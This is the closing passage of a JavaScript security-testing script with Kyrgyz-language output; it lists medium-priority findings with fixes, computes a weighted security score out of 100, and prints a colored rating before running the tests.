      log('cyan', `      💡 Оңдоо: ${v.fix}`);
    });
  }

  if (medium.length > 0) {
    log('yellow', '\n🟠 ОРТОЧО ПРИОРИТЕТ:');
    medium.forEach((v, i) => {
      console.log(`   ${i + 1}. ${v.name} - ${v.fix}`);
    });
  }

  // Баа берүү
  console.log('\n');
  const score = Math.max(0, 100 - (critical.length * 25) - (high.length * 15) - (medium.length * 5) - (low.length * 2));

  if (score >= 90) {
    log('bgGreen', `   🏆 КООПСУЗДУК РЕЙТИНГИ: ${score}/100 - ӨТӨ ЖАКШЫ!   `);
  } else if (score >= 70) {
    log('green', `   ✅ КООПСУЗДУК РЕЙТИНГИ: ${score}/100 - ЖАКШЫ`);
  } else if (score >= 50) {
    log('yellow', `   ⚠️ КООПСУЗДУК РЕЙТИНГИ: ${score}/100 - ОРТОЧО`);
  } else {
    log('bgRed', `   🚨 КООПСУЗДУК РЕЙТИНГИ: ${score}/100 - КОРКУНУЧТУУ!   `);
  }

  console.log('\n' + '═'.repeat(60) + '\n');
}

// Иштетүү
runSecurityTests().catch(console.error);